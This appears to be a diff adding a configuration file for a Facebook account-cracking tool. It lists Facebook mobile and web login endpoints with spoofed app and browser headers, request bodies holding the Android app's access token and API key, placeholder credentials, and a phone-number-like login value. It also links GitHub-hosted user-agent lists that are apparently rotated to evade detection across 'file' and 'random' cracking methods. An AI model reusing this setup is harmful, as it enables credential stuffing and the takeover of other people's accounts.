@@ -1,0 +1,30 @@
+ABAL TOXIC 😂😂
+#------------------------FILE METHOD 1-----------------------#
+ARAFAT URL : https://api.facebook.com/auth/login
+ARAFAT HEADER : {'User-Agent': '[FBAN/FB4A;FBAV/28.0.0.4128;FBBV/3097315[FBAN/FB4A;FBAV/444.0.0.16.114;FBBV/447811546;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/447811659;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A536B;FBSV/12;FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '23698', 'X-FB-SIM-HNI': '24354', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'X-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+ARAFAT DATA : {'adid': '59f393e7-1202-43d2-ae49-96a28f4fbcd6', 'format': 'json', 'device_id': 'f1b5eb59-37b1-4f77-b237-8084a6acc996', 'cpl': 'true', 'family_device_id': 'f975ba9d-78d1-4b90-8d2f-7ee2c437a3a7', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': 'TUR BAP ARAFAT', 'password': 'Arafat here', 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': 'f8db708d-bc99-4166-a1ca-4495b380ff57', 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
+#------------------------FILE METHOD 2-----------------------#
+ARAFAT URL : https://b-api.facebook.com/method/auth.login
+ARAFAT DATA : {'adid': '0ceb8e5d-3e98-4bbc-94c8-4633da08c754', 'email': 'TUR BAP ARAFAT', 'password': 'ARAFAT HERE', 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'en_US', 'client_country_code': 'US', 'device': '', 'device_id': '', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
+ARAFAT HEADER : {'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '36910', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'user-agent': '[FBAN/FB4A;FBAV/15.0.0.1195;FBBV/8153336[FBAN/FB4A;FBAV/455.0.0.0.51;FBBV/450005948;FBDM/{density=2.0,width=1080,height=2376};FBLC/en_US;FBRV/450005963;FBCR/Nepal Telecom;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo X60;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]', 'x-fb-net-hni': '34621', 'x-fb-connection-bandwidth': '23827393', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'accept-encoding': 'gzip, deflate', 'x-fb-http-engine': 'Liger'}
+#-----------------FILE UA SERVER-------------------------#
+https://raw.githubusercontent.com/MATAL-007/TOXIC-SARVER/main/fuck-M1
+https://raw.githubusercontent.com/MATAL-007/TOXIC-SARVER/main/fuck-M2
+https://raw.githubusercontent.com/MATAL-007/TOXIC-SARVER/main/fuck-M3
+https://raw.githubusercontent.com/MATAL-007/TOXIC-SARVER/main/fuck-M4
+https://raw.githubusercontent.com/MATAL-007/TOXIC-SARVER/main/fuck-M5
+https://raw.githubusercontent.com/MATAL-007/TOXIC-SARVER/main/fuck-M6
+#------------------------END-----------------------#
+RANDOM METHOD
+#------------------------RANDOM METHOD 1-----------------------#
+ARAFAT URL : https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100
+ARAFAT DATA : {'jazoest': '21001', 'lsd': 'AVozKP4fuHw', 'display': '', 'isprivate': '', 'return_session': '', 'skip_api_login': '', 'signed_next': '', 'trynum': '1', 'timezone': '-540', 'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=', 'lgnrnd': '022859_xXwd', 'lgnjs': '1718184538', 'email': '01815323760', 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'ab_test_data': 'AAAAAVAA/AAAqqV/qAAV/VAVAAAAAAAVAAAAAAVAAL5/FiRAAALAAN', 'encpass': '#PWD_BROWSER:0:1719048924:turmarhedq'}
+ARAFAT HEADER : {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'origin': 'https://bn-in.facebook.com', 'Priority': 'u=0, i', 'referer': 'https://bn-in.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzE0MzAwNjQwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D', 'Sec-Ch-Ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; LDN-L21 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5202.121 Mobile Safari/537.36'}
+#-----------------FILE UA SERVER-------------------------#
+https://raw.githubusercontent.com/MATAL-007/Rando/main/R1.txt
+https://raw.githubusercontent.com/MATAL-007/Rando/main/R2.txt
+https://raw.githubusercontent.com/MATAL-007/Rando/main/R3.txt
+https://raw.githubusercontent.com/MATAL-007/Rando/main/R4.txt
+https://raw.githubusercontent.com/MATAL-007/Rando/main/R5.txt
+https://raw.githubusercontent.com/MATAL-007/Rando/main/R6.txt
+https://raw.githubusercontent.com/MATAL-007/Rando/main/R7.txt
